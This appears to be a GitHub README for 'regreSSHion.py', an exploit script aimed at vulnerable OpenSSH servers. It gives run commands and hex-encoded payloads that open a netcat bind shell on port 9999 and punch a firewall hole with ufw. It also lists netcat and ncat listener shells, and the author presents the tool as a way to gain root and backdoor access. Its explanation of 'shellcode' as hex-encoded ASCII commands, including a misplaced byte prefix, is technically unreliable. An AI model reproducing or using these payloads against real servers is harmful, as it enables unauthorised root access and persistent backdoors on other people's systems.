```
To use the script, start python3 with regreSSHion.py
-  Set the ip to the vulnerable SSH server IPv4 address
-  Set the port to the vulnerable SSH server port number
```
python3 regreSSHion.py --ip 127.0.0.1 --port 22
```
```

```
If it says exploit verification success you have successfully delivered and executed your payload.
The script will try a few times to succeed.
I would suggest trying this on your own vulnerable SSH server until you get a feel for getting the success message.
```
2024-08-03 22:47:15,891 - ERROR - Exploitation failed.
```

Debug mode
-  With debug mode enabled you will get a more verbose output, this will show you the received SSH version string, packet length information, and some other things, pretty much everything that's happening that could possibly be logged.
```
python3 regreSSHion.py --ip 127.0.0.1 --port 22 --debug
```
Example Output:
```

# Editing regreSSHion.py
-  I use kali linux in WSL, but you might use something else, like a debian linux distro. Either way, here's how to edit it, and what to edit.

**using nano**
```
nano regreSSHion.py
```
**using vim**
```
vim regreSSHion.py
```
Things you might want to edit...

(line 20): CONNECTION_RETRIES = 5
-  Increasing this will increase the ammount of times the socket tries to connect, so if the exploit fails due to timing, it will retry this number of times.
Official documentation
-  (https://www.openssh.com/releasenotes.html#9.8p1) states: "Under lab conditions, the attack requires on average 6-8 hours of continuous connections up to the maximum the server will accept." I
-  I'm pretty sure it either just takes getting lucky, or a very specific packet injection technique to pull it off. 
-  You can finetune everything and see if it works, I would appreacite feedback so please open a discussion or issues tab if you have success or want help during your research of this exploit.

(line 437): shellcode = b"\x74\x65\x73\x74\x20\x3E\x20\x74\x65\x73\x74"
-  Changing this is the whole reason you're running the exploit to begin with.
-  Effectively you're tricking the SSH host (server) into giving you root access for a few seconds, allowing you to give it an arbitrary command.
-  Here's an example of a useless command.
"hello world"
```
shellcode = b"\x68\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64"
```
-  This would send "hello world" for nobody to see inside the socket based regreSSHion.py and vulnerable OpenSSH host (server).
-  *What you really want is a command that you can either test for to make sure it actually ran (like making a file called "test", wherever the home directory is for the SSH host), or sending you a webhook for proof of success, or opening a reverse shell (this will cause the connection to last more than a few seconds and give you backdoor access as long as the port is open).*
-  For the reverse shell I use default netcat (nc) which will listen on port 9999, and lock in a sh shell upon connection. This could also be a usr/bin/bash shell if you want.

**The next three sections show what an effective shellcode payload could be and how to create one.**
# Shellcode Payload Testing Examples
To change the payload, edit the shellcode hex on line 437 (large, permanent payloads) - or use the -s flag (small payloads)

```
hello world
```
```
"\x68\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64"
```
```
printf hello world
```
```
"\x70\x72\x69\x6E\x74\x66\x20\x68\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64"
```
```
echo hello world
```
```
"\x65\x63\x68\x6F\x20\x68\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64"
```
```
test > test
```
```
"\x74\x65\x73\x74\x20\x3E\x20\x74\x65\x73\x74"
```

# shellcode plaintext payloads
-  open a nc listener shell on port 9999
```
/usr/bin/nc -lvp 9999 -e /usr/bin/sh
```
```
"\x2F\x75\x73\x72\x2F\x62\x69\x6E\x2F\x6E\x63\x20\x2D\x6C\x76\x70\x20\x39\x39\x39\x39\x20\x2D\x65\x20\x2F\x75\x73\x72\x2F\x62\x69\x6E\x2F\x73\x68"
```
-  allow incoming connections on port 9999
```
ufw allow 9999
```
```
"\x75\x66\x77\x20\x61\x6C\x6C\x6F\x77\x20\x39\x39\x39\x39"
```
-  allow incoming connections on port 9999 with sudo
```
sudo ufw allow 9999
```
```
"\x73\x75\x64\x6F\x20\x75\x66\x77\x20\x61\x6C\x6C\x6F\x77\x20\x39\x39\x39\x39"
```
-  allow connections on port 9999 & open a nc shell on port 9999
```
ufw allow 9999 && /usr/bin/nc -lvp 9999 -e /usr/bin/sh
```
```
"\x75\x66\x77\x20\x61\x6C\x6C\x6F\x77\x20\x39\x39\x39\x39\x20\x26\x26\x20\x2F\x75\x73\x72\x2F\x62\x69\x6E\x2F\x6E\x63\x20\x2D\x6C\x76\x70\x20\x39\x39\x39\x39\x20\x2D\x65\x20\x2F\x75\x73\x72\x2F\x62\x69\x6E\x2F\x73\x68"
```
-  allow connections (port 9999) & open a nc shell on port 9999 with sudo
```
sudo ufw allow 9999 && /usr/bin/nc -lvp 9999 -e /usr/bin/sh
```
```
"\x73\x75\x64\x6F\x20\x75\x66\x77\x20\x61\x6C\x6C\x6F\x77\x20\x39\x39\x39\x39\x20\x26\x26\x20\x2F\x75\x73\x72\x2F\x62\x69\x6E\x2F\x6E\x63\x20\x2D\x6C\x76\x70\x20\x39\x39\x39\x39\x20\x2D\x65\x20\x2F\x75\x73\x72\x2F\x62\x69\x6E\x2F\x73\x68"
```
- Since we're getting a root shell connection with this exploit, sudo is not nessesary and may actually cause the exploit to fail depending on how the server is set up to handle sudo, in that it may prompt for a password despite our connection being root by default.
- I would suggest to only use the payloads with sudo during your testing of the script, or if you feel that it is nessesary, such as if you can gain a connection that is by default linked to a userprofile and the password for sudoing is blank.

# **shellcode payload creation**
You can make your own shellcode payload by using an ascii to hex editor, and manually converting it to shellcode. I use this ascii-to-hex website here:
```
https://www.rapidtables.com/convert/number/ascii-to-hex.html
```
- Input your desired text for the shellcode. 
- Use the settings "User defined" and "\x" in the input box.
- Replace all capital X's with lowecase x's
- Use notepad or another character replacement capable program.
![image](https://github.com/user-attachments/assets/982facb9-85de-4cbe-a6f3-0e17f9f74f7d)
-  Move the last \x from the end to the start of the hex string.
-  Add quotes to both ends for interpretation by the shell.
**Without byte specification:**
```
"\x68\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64"
```
- To have the program automatically conver the shellcode to type - bytes - add a "b" as the first character.
**With byte specification:**
```
"b\x68\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64"
```
This is so the program knows to convert the shellcode to bytes during the transfer.

# send_socket.py
If you want to test out the exection of a shellcode payload you can use the send_socket.py script. 
Usage:
```
usage: send_socket.py [-h] [-i IP] [-p PORT] [-shellcode SHELLCODE]

send shellcode to a target IP and port

options:
  -h, --help            show this help message and exit
  -i IP, --ip IP        target ip address (default: 127.0.0.1)
  -p PORT, --port PORT  target tcp socket port (default: 1111)
  -shellcode SHELLCODE  shellcode hex to send in format: \x00\x00\x00\...etc (default: printf hello world)
```
![image](https://github.com/user-attachments/assets/c4f0454f-f1c8-4002-a7b6-bfab3b22d05d)


With custom shellcode:
```
python3 send_socket.py -i 127.0.0.1 -p 22
```
**Listener:**

Netcat linux listener:
```
nc -lvvkp 1111
```
Netcat linux listener shell:
```
nc -lvvkp 1111 -e /usr/bin/bash
```
Netcat Windows listener:
```
ncat -lvvvvvvkp 1111"
```
Netcat Windows listener shell:
```
ncat -lvvvvvvkp 1111 -e "%SYSTEMDRIVE%\Windows\System32\cmd.exe"
```
